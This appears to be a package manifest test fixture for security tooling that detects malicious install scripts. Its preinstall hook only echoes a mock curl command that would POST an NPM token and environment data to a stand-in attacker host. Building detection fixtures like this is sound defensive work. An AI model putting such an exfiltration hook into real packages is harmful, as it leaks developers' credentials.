name: malicious-test-pkg
description: Local unpublished test fixture for safe-install security analysis

scripts.preinstall: echo [MOCK EXFIL] curl -X POST https://evil-collector.malicious-test.example/leak -H "Authorization: Bearer $NPM_TOKEN" -d "env=process.env" && echo [SAFE MOCK] No network request was made — this hook exists only to test script detection
